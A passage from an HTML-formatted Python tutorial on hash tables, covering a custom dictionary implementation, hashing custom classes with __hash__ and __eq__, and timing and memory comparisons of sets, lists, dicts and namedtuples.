&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __contains__(self, key: Any) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; bool:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2&lt;/span&gt;        _, entry_index &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_lookup(key, hash(key))
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; entry_index &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This method checks if the dictionary contains a certain key. It does so by checking the result of &lt;code&gt;_lookup&lt;/code&gt;, it only contains indices below zero in the case of &lt;code&gt;DUMMY&lt;/code&gt; or &lt;code&gt;FREE&lt;/code&gt;.&lt;/p&gt;
&lt;h4 id=&#34;__iter__&#34;&gt;&lt;code&gt;__iter__&lt;/code&gt;&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __iter__(self):
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; iter([dict_key&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;key &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; dict_key &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;key]s)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The dictionary&amp;rsquo;s keys list holds &lt;code&gt;DictKey&lt;/code&gt; instances. This method creates a new list of actual the actual keys (without the wrapper class) and wraps it inside of an iterable.&lt;/p&gt;
&lt;h3 id=&#34;using-your-custom-dictionary&#34;&gt;Using your custom dictionary&lt;/h3&gt;
&lt;p&gt;Here&amp;rsquo;s how you can use your brand new dictionary:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Dictionary(
    [(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;key1&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;value1&amp;#34;&lt;/span&gt;), (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;key2&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;value2&amp;#34;&lt;/span&gt;), (&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;different type of key&amp;#34;&lt;/span&gt;)]
)
d&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;show()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;show&lt;/code&gt; method will display all of the attributes, including the version number and the indices table.&lt;/p&gt;
&lt;p&gt;You can use the operations you&amp;rsquo;re used to from normal dictionaries:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;del&lt;/span&gt; d[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;key1&amp;#34;&lt;/span&gt;]
d[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;key2&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;foo&amp;#34;&lt;/span&gt;
d&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;update({&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;key1&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;})
d&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;show()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In order to play with the keys sharing feature, initialize your dictionary with an already initialized dictionary:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;new_d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Dictionary(d)
new_d[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;key1&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;other_value&amp;#34;&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# No longer sharing keys&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;toast toast--blue add-margin&#34;&gt;
	&lt;div class=&#34;toast__content&#34;&gt;
		&lt;p class=&#34;toast__type&#34;&gt;Note&lt;/p&gt;
		&lt;p class=&#34;toast__message&#34;&gt;
			&lt;a href=&#34;https://docs.python.org/3/library/collections.abc.html#collections.abc.MutableMapping&#34;&gt;&lt;code&gt;MutableMapping&lt;/code&gt;&lt;/a&gt; could have been inherited in order to implement common methods like &lt;code&gt;update&lt;/code&gt; and &lt;code&gt;pop&lt;/code&gt;. I decided not to use it in order to showcase the &lt;code&gt;update&lt;/code&gt; method.
		&lt;/p&gt;
	&lt;/div&gt;
&lt;/div&gt;

&lt;h3 id=&#34;dictionaries-order&#34;&gt;Dictionaries Order&lt;/h3&gt;
&lt;p&gt;As a side effect of using compact dictionaries, when iterating over the dictionary, the array of indices is not needed as the elements are sequentially returned from the entries table. Since elements are added to the end of the entries each time, the dictionary automatically preserves the order of entries.&lt;/p&gt;
&lt;div class=&#34;toast toast--blue add-margin&#34;&gt;
	&lt;div class=&#34;toast__content&#34;&gt;
		&lt;p class=&#34;toast__type&#34;&gt;Note&lt;/p&gt;
		&lt;p class=&#34;toast__message&#34;&gt;
			It was an implementation detail in Python 3.6, but &lt;a href=&#34;https://mail.python.org/pipermail/python-dev/2017-December/151283.html&#34;&gt;was declared a feature&lt;/a&gt; in Python 3.7.
		&lt;/p&gt;
	&lt;/div&gt;
&lt;/div&gt;

&lt;h2 id=&#34;hashing-your-custom-classes&#34;&gt;Hashing Your Custom Classes&lt;/h2&gt;
&lt;p&gt;You want to use a custom class as a dictionary key, or as a value in a set. Now that you know what the &lt;code&gt;hash&lt;/code&gt; method does, and how these structures are implemented, you know that you can take advantage of the &lt;code&gt;hash&lt;/code&gt; method and that you must also implement &lt;code&gt;__eq__&lt;/code&gt; because the keys are checked for equality. Note that it is required that objects which compare equal have the same hash value. It is advised to mix together the hash values of the attributes of the object that also play a part in comparison of objects by packing them into a tuple and hashing the tuple. The following is an example of a custom class &lt;code&gt;CustomClass&lt;/code&gt; hashing:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CustomClass&lt;/span&gt;:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, name: str, type_: str, size: str):
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; name
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;type_ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; type_
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; size

    &lt;span style=&#34;color:#a6e22e&#34;&gt;@property&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_key&lt;/span&gt;(self) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; Tuple[str, str, str]:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;name, self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;type_, self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;size)

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __hash__(self) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; int:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; hash(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_key)

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __eq__(self, other) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; Boolean:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; isinstance(other, CustomClass):
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_key &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; other&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_key
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NotImplemented
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You can see that &lt;code&gt;hash&lt;/code&gt; is being used for hashing a tuple of the custom class attributes, which should be fast enough, and that same tuple is also used for equality check.&lt;/p&gt;
&lt;div class=&#34;toast add-margin&#34;&gt;
	&lt;div class=&#34;toast__content&#34;&gt;
		&lt;p class=&#34;toast__type&#34;&gt;Comprehension Check&lt;/p&gt;
		&lt;p class=&#34;toast__message dark-text&#34;&gt;
			Why is it important for hashable objects to contain &lt;code&gt;__eq__&lt;/code&gt;?
		&lt;/p&gt;
		&lt;div class=&#34;toggle-solution&#34; id=&#34;eq_hash&#34;&gt;Show Solution&lt;/div&gt;
		&lt;div class=&#34;solution dark-text&#34; id=&#34;solution-eq_hash&#34;&gt;
			&lt;p&gt;You&amp;rsquo;ve seen the implementation of the lookup method, which contained the following line (line 63):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; dict_key&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;key &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; key &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; (
    dict_key&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hashvalue &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; hashvalue &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; dict_key&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;key &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; key
):
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Notice that &lt;code&gt;dict_key.key&lt;/code&gt; and &lt;code&gt;key&lt;/code&gt; are both hashable objects that are being compared.&lt;/p&gt;

		&lt;/div&gt;
	&lt;/div&gt;
&lt;/div&gt;

&lt;h2 id=&#34;understanding-when-to-use-python-hash-tables&#34;&gt;Understanding When to Use Python Hash Tables&lt;/h2&gt;
&lt;p&gt;Python hash tables (and hash tables in general) trade space for time. The need to store the key and the hash along with the value of the entries plus the empty slots, make the hash tables take up more memory - but also to be drastically faster (in most scenarios).&lt;/p&gt;
&lt;h3 id=&#34;set-vs-list&#34;&gt;set vs list&lt;/h3&gt;
&lt;div class=&#34;toast add-margin&#34;&gt;
	&lt;div class=&#34;toast__content&#34;&gt;
		&lt;p class=&#34;toast__type&#34;&gt;Comprehension Check&lt;/p&gt;
		&lt;p class=&#34;toast__message dark-text&#34;&gt;
			What&amp;rsquo;s faster, set or a list, when checking if a certain value exists?
		&lt;/p&gt;
		&lt;div class=&#34;toggle-solution&#34; id=&#34;whats-faster&#34;&gt;Show Solution&lt;/div&gt;
		&lt;div class=&#34;solution dark-text&#34; id=&#34;solution-whats-faster&#34;&gt;
			Because sets are implemented as hash tables, and hash tables make lookups much faster because of the hash function - A set would be much faster in lookups!
		&lt;/div&gt;
	&lt;/div&gt;
&lt;/div&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Speed&lt;/strong&gt;: You already know that lookups are faster in sets than list - That&amp;rsquo;s the whole point of having a hash table. Iterating over a list is slighly faster than sets. Don&amp;rsquo;t take my word for it:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; timeit &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; timeit
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_iterating&lt;/span&gt;(iterable):
&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; iterable:
&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; setup &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;from __main__ import test_iterating; iterable = set(range(10000))&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; timeit(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test_iterating(iterable)&amp;#34;&lt;/span&gt;, setup&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;setup, number&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10000&lt;/span&gt;)
&lt;span style=&#34;color:#ae81ff&#34;&gt;0.992495904000009&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; setup &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;from __main__ import test_iterating; iterable = list(range(10000))&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; timeit(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test_iterating(iterable)&amp;#34;&lt;/span&gt;, setup&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;setup, number&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10000&lt;/span&gt;)
&lt;span style=&#34;color:#ae81ff&#34;&gt;0.7114199559999861&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_lookups&lt;/span&gt;(iterable):
&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;):
&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; iterable:
&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;             &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; setup &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;from __main__ import test_lookups; iterable = set(range(10000))&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; timeit(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test_lookups(iterable)&amp;#34;&lt;/span&gt;, setup&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;setup, number&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10000&lt;/span&gt;)
&lt;span style=&#34;color:#ae81ff&#34;&gt;0.476039572000019&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; setup &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;from __main__ import test_lookups; iterable = list(range(10000))&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; timeit(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test_lookups(iterable)&amp;#34;&lt;/span&gt;, setup&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;setup, number&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10000&lt;/span&gt;)
&lt;span style=&#34;color:#ae81ff&#34;&gt;65.991043548&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Space:&lt;/strong&gt; If space is your main concern rather than speed, you are probably better off with lists - The difference is quite large.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; set1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; set(range(&lt;span style=&#34;color:#ae81ff&#34;&gt;10000&lt;/span&gt;))
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; list1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list(range(&lt;span style=&#34;color:#ae81ff&#34;&gt;10000&lt;/span&gt;))
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; set_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getsizeof(set1)
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; list_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getsizeof(list1)
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; set_size &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; list_size
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6.551713800339762&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Order:&lt;/strong&gt; Sets are not ordered, while lists are. As we&amp;rsquo;ve talked about, sets do not implement the separate dense table that dictionaries do, which results in a single &lt;strong&gt;unordered&lt;/strong&gt; table.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Hashing:&lt;/strong&gt; Lists do not require their elements to be hashable as opposed to sets.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;dict-vs-namedtuple&#34;&gt;dict vs namedtuple&lt;/h3&gt;
&lt;p&gt;Unlike sets and lists, dictionaries and &lt;code&gt;namedtuple&lt;/code&gt; are quite different in their uses. The main uses for &lt;code&gt;namedtuple&lt;/code&gt; are when you want an unmutable object that is much more readable than a dictionary and simpler than a class. As you will soon find out, &lt;code&gt;namedtuple&lt;/code&gt; is also much smaller than a dictionary - so add that to your considerations!&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Speed:&lt;/strong&gt; Usually, you won&amp;rsquo;t have to deal with very large &lt;code&gt;namedtuple&lt;/code&gt; instances nor will you iterate over them. I will however show the speed comparisons of the lookup function shown above, just in case you will.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; type_ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; namedtuple(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;, [f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;t{i}&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;)])
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; t1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; type_(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;list(range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;)))
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; d1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;t{i}&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;)}
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; setup &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;from __main__ import test_lookups, t1; iterable = t1&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; timeit(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test_lookups(iterable)&amp;#34;&lt;/span&gt;, setup&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;setup, number&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10000&lt;/span&gt;)
&lt;span style=&#34;color:#ae81ff&#34;&gt;64.43791548900026&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; setup &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;from __main__ import test_lookups, d1; iterable = d1&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; timeit(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test_lookups(iterable)&amp;#34;&lt;/span&gt;, setup&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;setup, number&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10000&lt;/span&gt;)
&lt;span style=&#34;color:#ae81ff&#34;&gt;0.5148220669998409&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Space:&lt;/strong&gt; &lt;code&gt;namedtuple&lt;/code&gt; takes drastically less space than a dictionary:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; collections &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; namedtuple
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; Car &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; namedtuple(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Car&amp;#39;&lt;/span&gt;, [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;color&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;size&amp;#39;&lt;/span&gt;])
